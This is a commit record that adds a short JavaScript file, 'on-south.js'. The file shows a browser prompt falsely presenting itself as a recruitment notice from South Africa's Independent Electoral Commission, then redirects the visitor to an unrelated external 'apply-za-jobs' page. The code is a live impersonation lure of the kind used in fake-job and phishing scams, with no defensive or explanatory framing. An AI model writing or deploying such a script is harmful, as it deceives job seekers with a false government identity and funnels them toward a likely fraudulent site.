e294cc94226c6b1be391758eea6d5deaca55019c
mmyafiong <seconds.borders-0g@icloud.com>
2026-09-21 18:07:32 +0100

    Create on-south.js

---
+++ on-south.js
@@ -0,0 +1,5 @@
+var password = 'IEC Recruitment'
+password=prompt('NOTICE: Independent Electoral Commission of South Africa (IEC) Recruitment is currently recruiting, press OK to apply for the','IEC Recruitment');
+if (password != 'IEC Recruitment') {
+location.href='https://www.mmyafiong.fit/apply-za-jobs';
+}
